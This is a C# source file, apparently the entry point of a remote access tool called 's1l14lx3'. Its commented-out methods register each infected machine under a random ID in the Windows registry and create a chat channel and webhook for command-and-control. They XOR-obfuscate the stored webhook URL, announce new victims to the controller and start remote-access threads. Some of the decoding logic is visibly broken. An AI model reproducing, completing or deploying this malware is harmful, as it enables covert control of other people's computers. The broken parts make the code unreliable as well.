using Microsoft.Win32;
using s1l14lx3;
using System.Reflection;
using System.Text;

public class NewProgram
{
    public static async Task NewMain(string[] args)
    {
        /*/
        //setup
        bool WiFi = S1l14lx3.CheckWiFi();
        while (!WiFi)
        {
            WiFi = S1l14lx3.CheckWiFi();
            Thread.Sleep(10000);
        }

        string id = S1l14lx3_Module.GETID();
        string wh = S1l14lx3_Module.GETWH();
        string cID = S1l14lx3_Module.GETCID();

        if (id == "Error" || id == "" || wh == "Error" || wh == "" || cID == "Error" || cID == "")
        {
            var characters = "qwertyuiopasdfghjklzxcvbnm1234567890";
            var Charsarr = new char[8];
            var random = new Random();
            for (int i = 0; i < Charsarr.Length; i++)
            {
                Charsarr[i] = characters[random.Next(characters.Length)];
            }
            var resultString = new String(Charsarr);
            Import.ID = resultString;
            Registry.SetValue(@"HKEY_CURRENT_USER\s1l14lx3", "ID", resultString);
            //channel setting
            string ResJson = await S1l14lx3_Module.ChannelCreate();
            var dynajson = DynaJson.JsonObject.Parse(ResJson);
            Import.ChannelID = dynajson.id;
            Registry.SetValue(@"HKEY_CURRENT_USER\s1l14lx3", "cID", dynajson.id);
            ResJson = await S1l14lx3_Module.WebhookCreate();
            dynajson = DynaJson.JsonObject.Parse(ResJson);
            Import.Webhook = dynajson.url;
            Registry.SetValue(@"HKEY_CURRENT_USER\s1l14lx3", "Webhook", Encoding.UTF8.GetString(Tools.XOR(Encoding.UTF8.GetBytes(dynajson.url), Encoding.UTF8.GetBytes(Import.ID)[1])));
        }
        else
        {
            Import.ID = id;
            Import.Webhook = wh;
            Import.ChannelID = cID;
        }

        //remote access start
        S1l14lx3.RunMain = true;
        S1l14lx3.RunSub = true;
        S1l14lx3.MainThread.Start();
        S1l14lx3.SubThread.Start();

        Tools.Wait();
        
        /*/
    }
    private static async void AsyncMain()
    {

        /*/
        //setup
        bool WiFi = S1l14lx3.CheckWiFi();
        while (!WiFi)
        {
            WiFi = S1l14lx3.CheckWiFi();
            Thread.Sleep(10000);
        }
        string chid = S1l14lx3_Module.GETID();
        string wh = S1l14lx3_Module.GETWH();
        string encodedWH = "";
        if (chid != null && chid != "Error" && chid != "")
        {
            Import.ID = chid;
        }
        else
        {
            string ID;
            var characters = "qwertyuiopasdfghjklzxcvbnm1234567890";
            var Charsarr = new char[7];
            var random = new Random();
            for (int i = 0; i < Charsarr.Length; i++)
            {
                Charsarr[i] = characters[random.Next(characters.Length)];
            }
            var resultString = new String(Charsarr);
            ID = resultString;
            Import.ID = ID;
            Registry.SetValue(@"HKEY_CURRENT_USER\s1l14lx3", "ID", ID);
        }
        if (wh != null && wh != "Error" && wh != "")
        {
            byte[] compressedData = Convert.FromBase64String(wh);
            string decompressedData = Convert.ToBase64String(Tools.XOR("", 0x11));
            Import.Webhook = decompressedData;
        }
        else
        {
            //encodedWH = await S1l14lx3_Module.ADD_POST(Import.ID);
            await S1l14lx3_Module.WEBHOOK_POST($"{Import.ID}:Created new user {Import.ID}.\nPlease set command.");
            while (encodedWH == "" || encodedWH == null || encodedWH == "null" || encodedWH == "Null")
            {
                encodedWH = S1l14lx3_Module.GET("/wh/" + Import.ID);
            }
            Registry.SetValue(@"HKEY_CURRENT_USER\s1l14lx3", "Webhook", encodedWH);
            byte[] compressedData = Convert.FromBase64String(encodedWH);
            string decompressedData = Encoding.UTF8.GetString(Tools.XOR("a", 0x11));
            Import.Webhook = decompressedData;
        }
        //remote access start
        S1l14lx3.RunMain = true;
        S1l14lx3.MainThread.Start();
        S1l14lx3.SubThread.Start();
        
        /*/
    }
}